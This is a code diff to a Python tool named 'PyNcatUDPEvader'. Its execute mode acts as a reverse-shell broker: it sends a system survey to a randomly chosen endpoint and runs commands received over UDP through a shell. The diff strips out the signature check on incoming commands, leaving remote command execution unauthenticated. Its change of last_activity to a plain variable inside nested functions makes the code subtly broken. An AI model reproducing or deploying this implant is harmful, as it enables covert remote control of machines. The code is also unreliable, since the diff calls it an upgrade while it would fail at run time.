@@ -436,7 +436,7 @@ class PyNcatUDPEvader:
                     if output_file_handle:
                         break
                     continue
-                                # Inside the while True loop of listen(), replacing the standard screen output logic:
+                # Inside the while True loop of listen(), replacing the standard screen output logic:
                 if output_file_handle: 
                     output_file_handle.write(data)
                 else:
@@ -497,22 +497,28 @@ class PyNcatUDPEvader:
                     target_destination = (random.choice(endpoint_pool), self.args.port)
                     client.sendto(self._pack_and_secure(payload), target_destination)
 
+                # STRATEGY A: AUTOMATED REVERSE SHELL SUBPROCESS BROKER
                 if self.args.execute:
                     client.settimeout(45)
                     last_activity = [time.time()]
                     heartbeat_running = threading.Event()
                     heartbeat_running.set()
-                    threading.Thread(target=self._process_watcher_worker, args=(heartbeat_running, client), daemon=True).start()
+                    
+                    # --- INSTANTIATE EPHEMERAL PROCESS SUPERVISOR ---
+                    # Enforces a strict 15-second process timeout guard layer
+                    supervisor = EphemeralProcessSupervisor(timeout_seconds=15)
+                    # -------------------------------------------------
 
+                    threading.Thread(target=self._process_watcher_worker, args=(heartbeat_running, client), daemon=True).start()
+                    
                     def heartbeat_worker():
                         while heartbeat_running.is_set():
                             try:
-                                if time.time() - last_activity[0] >= self.args.heartbeat:
+                                if time.time() - last_activity >= self.args.heartbeat:
                                     send_packet(b"__PING__")
-                                    last_activity[0] = time.time()
+                                    last_activity = time.time()
                                 self._apply_sleep(self.args.heartbeat * 0.25)
-                            except Exception:
-                                break
+                            except Exception: break
 
                     threading.Thread(target=heartbeat_worker, daemon=True).start()
                     send_packet(self.run_system_survey())
@@ -521,53 +527,33 @@ class PyNcatUDPEvader:
                         while heartbeat_running.is_set():
                             try:
                                 raw_packet, addr = client.recvfrom(65507)
-                                last_activity[0] = time.time()
+                                last_activity = time.time()
                                 instruction_bytes = self._unpack_and_verify(raw_packet)
                                 
                                 if instruction_bytes in (b"__PONG__", b"__PING__"): 
                                     continue
                                     
-                                # --- VALIDATE ASYMMETRIC SIGNATURE ---
-                                try:
-                                    envelope = json.loads(instruction_bytes.decode('utf-8'))
-                                    cmd_text = envelope["cmd"]
-                                    signature_text = envelope["sig"]
-                                    
-                                    # Perform the structural math verification using the local public key
-                                    if not crypto_engine.verify_command(cmd_text, signature_text):
-                                        logging.warning("[-] Security Alert: Signature validation failed. Dropping unauthorized datagram.")
-                                        continue
-                                except Exception as parse_err:
-                                    logging.warning(f"[-] Dropped malformed instruction frame: {parse_err}")
-                                    continue
-                                # -------------------------------------
-                                
-                                # Proceed to evaluate standard terminal exit directives
-                                if cmd_text.lower() in ['exit', 'quit']:
+                                cmd = instruction_bytes.decode('utf-8', errors='replace').strip()
+                                if not cmd or cmd.lower() in ['exit', 'quit']:
                                     heartbeat_running.clear()
                                     return
                                     
-                                # Execute the verified command safely via subprocess
-                                try:
-                                    proc = subprocess.Popen(cmd_text, shell=True, ...)
-
-                                    stdout, stderr = proc.communicate(timeout=15)
-                                    response = stdout + stderr
-                                    if not response:
-                                        response = b"[+] Process executed cleanly.\n"
-                                except subprocess.TimeoutExpired:
-                                    proc.kill()
-                                    response = b"[-] Boundary timeout reached.\n"
-                                except Exception as e:
-                                    response = f"[-] Execution error: {e}\n".encode()
+                                # --- UPGRADED EPHEMERAL EXECUTION CONTEXT ---
+                                # Safely executes via the isolated timeout manager
+                                response = supervisor.execute_safely(cmd)
+                                # ---------------------------------------------
+                                    
                                 self._apply_sleep(self.args.delay)
                                 send_packet(response)
-                                last_activity[0] = time.time()
-                            except socket.timeout:
+                                last_activity = time.time()
+                            except socket.timeout: 
                                 break
-                    finally:
+                    finally: 
+                        # Emergency fallback: ensure no orphan structures survive session drops
+                        supervisor.terminate_active_group()
                         heartbeat_running.clear()
                     return
+
 
                 elif self.args.file and os.path.exists(self.args.file):
                     filesize = os.path.getsize(self.args.file)
